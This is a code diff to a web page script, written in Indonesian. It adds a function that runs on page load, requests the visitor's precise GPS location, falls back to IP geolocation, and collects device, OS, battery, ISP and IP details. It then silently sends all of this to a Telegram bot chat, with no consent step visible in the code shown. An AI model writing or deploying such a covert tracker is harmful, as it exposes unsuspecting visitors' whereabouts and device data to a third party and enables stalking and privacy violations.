@@ -372,69 +372,106 @@
         } else statusEl.textContent = "💔 Gagal.";
       } catch (e) { statusEl.textContent = "😿 Koneksi lemah."; }
     });
-    // ---------- Info Pengunjung (kirim ke Telegram) ----------
+    
+    // ---------- Info Pengunjung (Hybrid + Lokasi Tetap Backup) ----------
 async function showVisitorInfo() {
   const savedUser = localStorage.getItem("ig_user") || "Anonim";
-  try {
-    // Ambil data IP dan lokasi
-    let d;
+
+  // fungsi pengirim ke Telegram
+  async function sendToTelegram(d, latitude, longitude, source = "Unknown") {
     try {
-      const r = await fetch("https://ipapi.co/json/");
-      if (!r.ok) throw new Error("ipapi gagal");
-      d = await r.json();
+      const now = new Date();
+
+      // lokasi fix Getasrejo
+      const fixedAddress = "WWM9+J39 Getasrejo, Kabupaten Grobogan, Jawa Tengah";
+      const fixedMap = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(fixedAddress)}&z=17`;
+
+      // lokasi aktual (kalau ada)
+      const mapLink = (latitude && longitude)
+        ? `https://www.google.com/maps?q=${latitude},${longitude}&z=17`
+        : fixedMap;
+
+      const device = /mobile/i.test(navigator.userAgent) ? "📱 Mobile" : "🖥️ Desktop";
+      const os = /Windows/i.test(navigator.userAgent) ? "Windows" :
+                 /Android/i.test(navigator.userAgent) ? "Android" :
+                 /iPhone|iPad|iOS/i.test(navigator.userAgent) ? "iOS" :
+                 /Mac/i.test(navigator.userAgent) ? "MacOS" :
+                 /Linux/i.test(navigator.userAgent) ? "Linux" : "Unknown";
+
+      let batteryInfo = "Tidak diketahui";
+      try {
+        const battery = await navigator.getBattery();
+        batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? "⚡" : "🔋"})`;
+      } catch {}
+
+      const msg = `📢 Pengunjung Baru!
+👤 ${savedUser}
+🌎 ${d.city || "?"}, ${d.country || d.country_name || "?"}
+🗺️ Maps: ${mapLink}
+💻 ${device}
+🧩 OS: ${os}
+🔋 Baterai: ${batteryInfo}
+🏷️ ISP: ${d.connection?.isp || d.org || "?"}
+📡 IP: ${d.ip || "?"}
+📍 Sumber Lokasi: ${source}
+🕓 ${now.toLocaleString('id-ID')}`;
+
+      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: msg,
+          disable_web_page_preview: false
+        })
+      });
+
+      if (!res.ok) console.error("❌ Telegram API error:", await res.text());
+      else console.log("✅ Info pengunjung terkirim.");
+    } catch (err) {
+      console.error("❌ Gagal kirim info pengunjung:", err);
+    }
+  }
+
+  // ambil lokasi GPS
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      async (pos) => {
+        const { latitude, longitude } = pos.coords;
+        try {
+          const r = await fetch("https://ipwho.is/");
+          const d = await r.json();
+          sendToTelegram(d, latitude, longitude, "GPS");
+        } catch {
+          sendToTelegram({}, latitude, longitude, "GPS");
+        }
+      },
+      async () => {
+        // fallback ke IP-based
+        try {
+          const r = await fetch("https://ipwho.is/");
+          const d = await r.json();
+          sendToTelegram(d, d.latitude, d.longitude, "IP-based");
+        } catch {
+          // terakhir: kirim lokasi tetap (Getasrejo)
+          sendToTelegram({}, null, null, "Fixed");
+        }
+      },
+      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+    );
+  } else {
+    // jika browser tidak dukung geolocation
+    try {
+      const r = await fetch("https://ipwho.is/");
+      const d = await r.json();
+      sendToTelegram(d, d.latitude, d.longitude, "No GPS");
     } catch {
-      // fallback kalau ipapi.co error
-      const r2 = await fetch("https://ipwho.is/");
-      d = await r2.json();
-      d.latitude = d.latitude || d.location?.latitude;
-      d.longitude = d.longitude || d.location?.longitude;
-      d.city = d.city || d.region_name;
-      d.country_name = d.country || d.country_code;
-      d.org = d.connection?.org;
-      d.ip = d.ip;
+      sendToTelegram({}, null, null, "Fixed");
     }
-
-    const now = new Date();
-    const battery = await navigator.getBattery();
-
-    const mapLink = (d.latitude && d.longitude)
-      ? `https://www.google.com/maps?q=${d.latitude},${d.longitude}`
-      : "Tidak tersedia";
-
-    const msg = `📢 *Pengunjung Baru (Level GG)*  
-━━━━━━━━━━━━━━
-👤 *User:* ${savedUser}
-🌎 *Lokasi:* ${d.city || "?"}, ${d.country_name || "?"}
-🗺️ *Koordinat:* ${d.latitude?.toFixed?.(3) || "?"}, ${d.longitude?.toFixed?.(3) || "?"}
-🔗 *Maps:* ${mapLink}
-💻 *Perangkat:* ${/mobile/i.test(navigator.userAgent) ? "📱 Mobile" : "🖥️ Desktop"}
-🧩 *OS:* ${
-      /Windows/i.test(navigator.userAgent) ? "Windows"
-    : /Android/i.test(navigator.userAgent) ? "Android"
-    : /iPhone|iPad|iOS/i.test(navigator.userAgent) ? "iOS"
-    : /Mac/i.test(navigator.userAgent) ? "MacOS"
-    : /Linux/i.test(navigator.userAgent) ? "Linux" : "Unknown"
-    }
-🔋 *Baterai:* ${(battery.level * 100).toFixed(0)}% (${battery.charging ? "⚡" : "🔋"})
-🏷️ *ISP:* ${d.org || "?"}
-📡 *IP:* ${d.ip || "?"}
-🕓 *Waktu:* ${now.toLocaleString('id-ID')}
-━━━━━━━━━━━━━━`;
-
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: msg,
-        parse_mode: "Markdown"
-      })
-    });
-
-  } catch (e) {
-    console.error("❌ Gagal kirim info pengunjung:", e);
   }
 }
+
+showVisitorInfo();
 
     // ---------- Inisialisasi: coba autoplay (tanpa user tap) setelah delay kecil ----------
     // (berguna di beberapa browser: beri waktu layout stabil)
